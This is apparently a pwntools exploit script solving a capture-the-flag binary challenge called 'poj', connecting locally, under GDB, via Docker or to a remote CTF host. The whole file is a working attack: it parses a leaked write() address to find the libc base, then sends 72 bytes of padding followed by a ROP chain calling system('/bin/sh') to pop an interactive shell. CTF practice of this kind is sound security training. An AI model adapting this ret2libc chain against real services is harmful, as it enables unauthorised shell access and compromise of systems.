#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./poj_patched")
libc = ELF("./libc.so.6")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc challenge.bugpwn.com 1003"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"Write() address : ")
    libc.address = int(r.recvline(), 16) - libc.sym.write

    rop = ROP(libc)
    rop.rdi = libc.binsh()
    rop.raw(rop.ret.address)
    rop.raw(libc.sym.system)

    r.sendline(b"A"*72 + rop.chain())

    r.interactive()

if __name__ == "__main__":
    main()